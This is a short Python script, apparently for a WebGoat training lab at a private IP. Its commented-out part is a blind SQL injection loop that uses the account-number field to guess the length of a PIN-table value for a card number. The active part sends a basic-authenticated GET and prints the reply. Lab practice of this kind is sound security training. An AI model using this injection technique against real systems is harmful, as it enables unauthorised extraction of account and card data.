import requests

url ="http://10.0.2.15/WebGoat/attack"
# cookies = {"JSESSIONID":"D48EDBF885B77BC1536D15068E139421", "acopendivids":"swingset,jotto,phpbb2,redmine","acgroupswithpersist":"nada"}
# def find_len():
#     flen = 0
    
#     while 1:
#         flen += 1
#         pa = "account_number"
#         attack = "101 AND {flen}=LENGTH(SELECT name FROM pins WHERE cc_number=4321432143214321)"
#         params = {pa:attack, 'SUBMIT':"Go%21"}
#         response = requests.get(url,params,cookies)
#         print(response.status_code)
#         if "Account number is valid" in response.text:
#             print(flen)
#             break


# url = 'http://10.0.2.15/WebGoat/attack'

headers = {
    'Host': '10.0.2.15',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Referer': 'http://10.0.2.15/',
    'Upgrade-Insecure-Requests': '1',
    'Authorization': 'Basic d2ViZ29hdDp3ZWJnb2F0'
}

response = requests.get(url, headers=headers)


# Process the response
print(response.text)    
